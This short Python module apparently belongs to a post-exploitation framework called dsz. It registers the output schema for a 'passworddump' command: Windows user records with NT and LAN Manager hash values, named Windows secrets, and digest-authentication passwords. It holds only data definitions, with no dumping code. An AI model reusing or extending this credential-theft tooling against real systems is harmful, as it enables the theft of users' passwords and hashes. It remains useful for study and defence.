
from ops.data import OpsClass, OpsField, DszObject, DszCommandObject, cmd_definitions
import dsz
if ('passworddump' not in cmd_definitions):
    dszwindowspassword = OpsClass('windowspassword', {'exception': OpsField('exception', dsz.TYPE_BOOL), 'expired': OpsField('expired', dsz.TYPE_BOOL), 'rid': OpsField('rid', dsz.TYPE_INT), 'user': OpsField('user', dsz.TYPE_STRING), 'nthash': OpsClass('nthash', {'present': OpsField('present', dsz.TYPE_BOOL), 'empty': OpsField('empty', dsz.TYPE_BOOL), 'value': OpsField('value', dsz.TYPE_STRING)}, DszObject, single=True), 'lanmanhash': OpsClass('lanmanhash', {'present': OpsField('present', dsz.TYPE_BOOL), 'empty': OpsField('empty', dsz.TYPE_BOOL), 'value': OpsField('value', dsz.TYPE_STRING)}, DszObject, single=True)}, DszObject, single=False)
    dszwindowssecret = OpsClass('windowssecret', {'name': OpsField('name', dsz.TYPE_STRING), 'value': OpsField('value', dsz.TYPE_STRING)}, DszObject, single=False)
    dszdigestpassword = OpsClass('digestpassword', {'domain': OpsField('domain', dsz.TYPE_STRING), 'user': OpsField('user', dsz.TYPE_STRING), 'password': OpsField('password', dsz.TYPE_STRING)}, DszObject, single=False)
    passworddumpcommand = OpsClass('passworddump', {'windowspassword': dszwindowspassword, 'windowssecret': dszwindowssecret, 'digestpassword': dszdigestpassword}, DszCommandObject)
    cmd_definitions['passworddump'] = passworddumpcommand